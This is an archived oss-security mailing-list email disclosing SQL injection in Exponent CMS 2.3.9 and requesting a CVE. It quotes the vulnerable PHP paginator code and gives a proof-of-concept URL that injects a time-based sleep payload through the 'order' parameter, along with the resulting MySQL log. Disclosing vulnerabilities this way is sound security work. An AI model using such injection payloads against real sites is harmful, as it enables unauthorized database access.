X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4129" "Monday" "19" "September" "2016" "08:08:32" "-0400" "=?UTF-8?B?546L56a55ZOy?=" "0xtom4to@gmail.com" "<CAJ8RaNbqj2sOAtx51OZ7_7O2TbP2q8+O=7G14xjXz5bcAM1NcQ@mail.gmail.com>" "113" "[oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities" nil nil nil "9" "2016091912:08:32" "[oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities" (number mark "U       0xtom4to@gma Sep 19  113/4129  " thread-indent "\"[oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11543 invoked by uid 550); 19 Sep 2016 12:12:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9498 invoked from network); 19 Sep 2016 12:08:45 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=from:mime-version:date:message-id:subject:to:cc;
        bh=UpumzYKWgljk9jmqNYA/M5DdsTxBw6Dyce5P/NDKGXk=;
        b=Wu5TBCEA8xaaKvpLUj5DpFfcyb8vNPvXu1nvAdbSEaO3C9mzC+Vk8axCarwtsIjYmP
         n98DBnkYr7y19qJPiuDLnEC7N6LKOS83wwasWT1eIKdQcY1xysayYd3a7FwXAkAlfeVQ
         /uP+vUhHFhpYZUDJANi+/rwld4+AYQtkdAurPmmxzJgbwy3UucUS75CgSxoNYRX90xFE
         gL+cu16/GCwIz5+rVboMiDx8n7WjG7xP2st2KjlooAvDG9lXhIruN8f4KCqrFgjA/WcW
         IpjwaWeGA2gfb/+LpEihXOEOACQst94+DXkMt5FpqmLcZVBEF6UgS3SQo3Pny4ArSS4Y
         Kjdg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:mime-version:date:message-id:subject:to:cc;
        bh=UpumzYKWgljk9jmqNYA/M5DdsTxBw6Dyce5P/NDKGXk=;
        b=WGLwH5gl3spyiOEuD/bxFGTZA+6PmO8SCiG8lhVWY5Eai+sgBRTP8XRLJGqu3xsLg3
         wc5IQWgEZ+4jYfjSOg2HQ6MoVGR1P+afiULwBdnAepqnwFMn640tGqDYLzrOv7clXt8l
         0Q2qTZYrhXrl82U9MvEgVEPSgqAvvF6I1DoEh9JRCWIWaHP4Xhs/i8tSNvy0uEUusSX1
         kASruVlqmYOobmMm0RkRFvuDF4ivVojlXCnQiDZmodCesj47Vl9JP6zsH1Ni5dMqI7Dj
         L8zaCv22aOiotfNsru/ttCj52ekAXBJXgzhUqVBUw8lI+li+jqneQJVRfihXgGK3+7Mp
         wjMQ==
X-Gm-Message-State: AE9vXwOjdfxkLUhtuutuTQQ2o2pAYK68YSQK6jE9YH+l7A2FLsA3EaZXKh6pEXgjWC8Bf90yDvL81jxZu6oOUQ==
X-Received: by 10.66.138.37 with SMTP id qn5mr46710264pab.33.1474286913149;
 Mon, 19 Sep 2016 05:08:33 -0700 (PDT)
From: =?UTF-8?B?546L56a55ZOy?= <0xtom4to@gmail.com>
X-Mailer: Airmail (382)
MIME-Version: 1.0
Date: Mon, 19 Sep 2016 08:08:32 -0400
Message-ID: <CAJ8RaNbqj2sOAtx51OZ7_7O2TbP2q8+O=7G14xjXz5bcAM1NcQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: cve-assign@mitre.org
Content-Type: multipart/alternative; boundary=047d7b15a7e5c16052053cdb2bd6
Subject: [oss-security] Exponent CMS 2.3.9 SQL injection vulnerabilities

--047d7b15a7e5c16052053cdb2bd6
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Author: Tomato, jianing.wang@chaitin.com

Date:2016=E2=80=9309=E2=80=9319

Version: 2.3.9 and earlier

/exponent=E2=80=932.3.9/framework/core/subsystems/expPaginator.php


if (strstr($this->order," ")) {
            $orderby =3D explode(" ",$this->order);
            $this->order =3D $orderby[0];
            $this->order_direction =3D $orderby[1];
        }
        if ($this->dontsort)
            $sort =3D null;
        else
            $sort =3D $this->order.' '.$this->order_direction;

        // figure out how many records we're dealing with & grab the records
        //if (!empty($this->records)) { //from Merge <~~ this doesn't
work. Could be empty, but still need to hit.
        if (!empty($this->categorize))
            $limit =3D null;
        else
            $limit =3D $this->limit;

        if (isset($params['records'])) { // if we pass
$params['records'], we WANT to hit this
            // sort the records that were passed in to us
            if (!empty($sort))
                usort($this->records,array('expPaginator',
strtolower($this->order_direction)));
//          $this->total_records =3D count($this->records);
        } elseif (!empty($class)) { //where clause     //FJD: was
$this->class, but wasn't working...
            $this->total_records =3D $class->find('count', $this->where);
            $this->records =3D $class->find('all', $this->where, $sort,
$limit, $this->start);
        } elseif (!empty($this->where)) { //from Merge....where clause
            $this->total_records =3D $class->find('count', $this->where);
            $this->records =3D $class->find('all', $this->where, $sort,
$limit, $this->start);
        } else { //sql clause  //FIXME we don't get attachments in this app=
roach
            //$records =3D $db->selectObjectsBySql($this->sql);
            //$this->total_records =3D count($records);
            //this is MUCH faster if you supply a proper count_sql
param using a COUNT() function; if not,
            //we'll run the standard sql and do a queryRows with it
            //$this->total_records =3D $this->count_sql =3D=3D '' ?
$db->queryRows($this->sql) : $db->selectValueBySql($this->count_sql);
//From Merge

//          $this->total_records =3D
$db->countObjectsBySql($this->count_sql);
//$db->queryRows($this->sql); //From most current Trunk

            if (!empty($sort)) $this->sql .=3D ' ORDER BY '.$sort;


i can controller $order ,i can use this parameter to sql injection

such as

exponent=E2=80=932.3.9/framework/modules/company/controllers/companyControl=
ler.php

```php function showall() { expHistory::set(=E2=80=98viewable=E2=80=99, $th=
is->params);
$page =3D new expPaginator(array( =E2=80=98model=E2=80=99=3D>$this->basemod=
el_name, =E2=80=98where=E2=80=99=3D>1,
=E2=80=98limit=E2=80=99=3D>(isset($this->params[=E2=80=98limit=E2=80=99]) &=
& $this->config[=E2=80=98limit=E2=80=99] !=3D =E2=80=99=E2=80=98) ?
$this->params[=E2=80=98limit=E2=80=99] : 10, =E2=80=98order=E2=80=99=3D>iss=
et($this->params[=E2=80=98order=E2=80=99]) ?
$this->params[=E2=80=98order=E2=80=99] : =E2=80=98rank=E2=80=99, =E2=80=98p=
age=E2=80=99=3D>(isset($this->params[=E2=80=98page=E2=80=99]) ?
$this->params[=E2=80=98page=E2=80=99] : 1), =E2=80=98controller=E2=80=99=3D=
>$this->baseclassname,
=E2=80=98action=E2=80=99=3D>$this->params[=E2=80=98action=E2=80=99], =E2=80=
=98columns=E2=80=99=3D>array(
gt(=E2=80=98Manufacturer=E2=80=99)=3D>=E2=80=99title=E2=80=99, gt(=E2=80=98=
Website=E2=80=99)=3D>=E2=80=99website=E2=80=99 ), ));

    assign_to_template(array(
        'page'=3D>$page,
        'items'=3D>$page->records
    ));
}
```

the poc is

http://127.0.0.1/exponent=E2=80=932.3.9/index.php?controller=3Dcompany&acti=
on=3Dshowall&limit=3D1&order=3D(select/*
*/*/*/from/*/(select/**/sleep(5))x)%23

in the mysql log we can see this

SELECT * FROM exponent_companies WHERE 1 ORDER BY
(select/**/*/*/from/*/(select/**/sleep(5))x)#
ASC LIMIT 0,10

Could you assign CVE id for this?

Regards, Tomato

--047d7b15a7e5c16052053cdb2bd6--
